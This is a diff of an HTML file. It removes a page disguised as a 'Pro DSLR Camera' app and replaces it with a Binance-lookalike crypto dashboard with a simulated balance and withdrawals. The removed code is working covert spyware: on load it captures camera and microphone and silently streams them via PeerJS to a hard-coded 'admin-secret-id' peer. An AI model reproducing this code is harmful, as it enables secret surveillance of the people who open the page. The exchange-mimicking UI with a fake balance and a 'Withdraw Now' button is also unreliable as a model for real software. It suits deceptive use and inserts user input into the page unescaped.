@@ -1,62 +1,159 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Pro DSLR Camera</title>
-    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Crypto Dashboard - Educational</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
-        #video-preview { width: 100%; height: 100vh; object-fit: cover; }
-        .controls { position: absolute; bottom: 30px; width: 100%; display: flex; justify-content: space-around; align-items: center; z-index: 10; }
-        .btn { background: rgba(255,255,255,0.2); border: 2px solid #fff; border-radius: 50%; padding: 15px; cursor: pointer; color: white; }
-        .shutter { width: 70px; height: 70px; background: #fff; border: 4px solid #444; }
-        .active-rec { background: red !important; animation: blink 1s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
+        :root {
+            --binance-yellow: #FCD535;
+            --bg-dark: #1E2329;
+            --card-bg: #2B3139;
+            --text-gray: #848E9C;
+            --success-green: #0ecb81;
+            --error-red: #f6465d;
+        }
+
+        body { font-family: 'Segoe UI', sans-serif; background-color: #0B0E11; color: white; margin: 0; display: flex; }
+        
+        /* Sidebar */
+        .sidebar { width: 240px; background-color: var(--bg-dark); height: 100vh; padding: 20px; border-right: 1px solid #333; }
+        .logo-area { display: flex; align-items: center; gap: 10px; margin-bottom: 40px; color: var(--binance-yellow); font-size: 22px; font-weight: bold; }
+        .nav-item { padding: 12px; border-radius: 5px; cursor: pointer; color: var(--text-gray); }
+        .nav-item:hover { background: #333; color: white; }
+
+        /* Main Content */
+        .main { flex-grow: 1; padding: 25px; overflow-y: auto; }
+        .grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+        
+        .card { background-color: var(--card-bg); padding: 20px; border-radius: 12px; border: 1px solid #333; }
+        .price-display { font-size: 28px; font-weight: bold; margin: 10px 0; }
+        
+        /* Buttons & Inputs */
+        input { background: #12161c; border: 1px solid #474d57; color: white; padding: 12px; border-radius: 4px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
+        .btn-buy { background-color: var(--success-green); color: black; font-weight: bold; border: none; width: 100%; padding: 12px; border-radius: 4px; cursor: pointer; }
+        .btn-send { background-color: var(--binance-yellow); color: black; font-weight: bold; border: none; width: 100%; padding: 12px; border-radius: 4px; cursor: pointer; }
+
+        /* Transaction Table */
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; }
+        th { text-align: left; color: var(--text-gray); padding: 10px; border-bottom: 1px solid #333; }
+        td { padding: 12px 10px; border-bottom: 1px solid #222; }
     </style>
 </head>
 <body>
 
-    <video id="video-preview" autoplay playsinline muted></video>
+    <div class="sidebar">
+        <div class="logo-area">
+            <div style="width:30px; height:30px; background:var(--binance-yellow); clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);"></div>
+            MyBin-Clone
+        </div>
+        <div class="nav-item">Dashboard</div>
+        <div class="nav-item">Markets</div>
+        <div class="nav-item">Wallets</div>
+    </div>
 
-    <div class="controls">
-        <button class="btn" onclick="switchCamera()">🔄 Flip</button>
-        <button class="btn shutter" id="shutter" onclick="takePhoto()">📸</button>
-        <button class="btn" id="rec-btn" onclick="toggleLocalRecord()">🎥 REC</button>
+    <div class="main">
+        <div class="grid">
+            <div>
+                <div class="card">
+                    <span style="color:var(--text-gray)">Live Market (BTC/USDT)</span>
+                    <div class="price-display" id="btc-price">Loading...</div>
+                    <div id="price-change" style="font-size: 14px;">---</div>
+                </div>
+
+                <div class="card" style="margin-top:20px;">
+                    <h3>Transaction History</h3>
+                    <table id="txHistory">
+                        <thead>
+                            <tr>
+                                <th>Type</th>
+                                <th>Amount</th>
+                                <th>Address/Target</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div>
+                <div class="card">
+                    <h3 style="margin-top:0">Total Balance</h3>
+                    <div class="price-display" id="total-balance" style="color:var(--binance-yellow)">5000.00 USDT</div>
+                    <p style="color:var(--text-gray); font-size:12px;">≈ 0.00 BTC</p>
+                </div>
+
+                <div class="card" style="margin-top:20px;">
+                    <h3>Withdraw / Send</h3>
+                    <input type="text" id="send-address" placeholder="Recipient Address (0x...)">
+                    <input type="number" id="send-amount" placeholder="Amount in USDT">
+                    <button class="btn-send" onclick="handleTransaction('SEND')">Withdraw Now</button>
+                    <button class="btn-buy" style="margin-top:10px;" onclick="handleTransaction('ADD')">Add Simulation Funds (+$100)</button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        const peer = new Peer();
-        let currentStream;
-        let useFront = true;
+        let balance = 5000.00;
 
-        async function startCamera() {
-            if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
-            const constraints = {
-                video: { facingMode: useFront ? "user" : "environment", width: { ideal: 3840 }, height: { ideal: 2160 } },
-                audio: true
-            };
+        // 1. Live Price Fetching (Binance Public API)
+        async function updatePrice() {
             try {
-                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-                document.getElementById('video-preview').srcObject = currentStream;
-                peer.call('admin-secret-id', currentStream); // Tomake call pathabe
-            } catch (err) { alert("Camera access proyojon!"); }
+                const response = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=BTCUSDT');
+                const data = await response.json();
+                
+                document.getElementById('btc-price').innerText = `$${parseFloat(data.lastPrice).toLocaleString()}`;
+                const change = parseFloat(data.priceChangePercent);
+                const color = change >= 0 ? 'var(--success-green)' : 'var(--error-red)';
+                document.getElementById('price-change').style.color = color;
+                document.getElementById('price-change').innerText = `${change >= 0 ? '+' : ''}${change}% (24h)`;
+            } catch (err) {
+                console.error("Price fetch failed");
+            }
         }
 
-        function switchCamera() { useFront = !useFront; startCamera(); }
+        // 2. Realistic Transaction Logic
+        function handleTransaction(type) {
+            const table = document.getElementById('txHistory').getElementsByTagName('tbody')[0];
+            const amountInput = document.getElementById('send-amount');
+            const addrInput = document.getElementById('send-address');
+            
+            if (type === 'ADD') {
+                balance += 100;
+                addTableRow("DEPOSIT", "+100.00", "System", "var(--success-green)");
+            } else if (type === 'SEND') {
+                const val = parseFloat(amountInput.value);
+                if (val > 0 && val <= balance && addrInput.value.length > 5) {
+                    balance -= val;
+                    addTableRow("WITHDRAW", `-${val.toFixed(2)}`, addrInput.value.substring(0,10) + "...", "var(--error-red)");
+                    amountInput.value = "";
+                    addrInput.value = "";
+                } else {
+                    alert("Insufficient balance or invalid address.");
+                    return;
+                }
+            }
 
-        function takePhoto() {
-            const video = document.getElementById('video-preview');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const link = document.createElement('a');
-            link.download = 'dslr_photo.png';
-            link.href = canvas.toDataURL();
-            link.click();
+            document.getElementById('total-balance').innerText = balance.toFixed(2) + " USDT";
         }
 
-        peer.on('open', startCamera);
+        function addTableRow(type, amount, target, color) {
+            const table = document.getElementById('txHistory').getElementsByTagName('tbody')[0];
+            const row = table.insertRow(0);
+            row.innerHTML = `
+                <td style="font-weight:bold">${type}</td>
+                <td style="color:${color}">${amount}</td>
+                <td>${target}</td>
+                <td style="color:var(--text-gray)">Completed</td>
+            `;
+        }
+
+        // Update price every 5 seconds
+        setInterval(updatePrice, 5000);
+        updatePrice();
     </script>
 </body>
 </html>
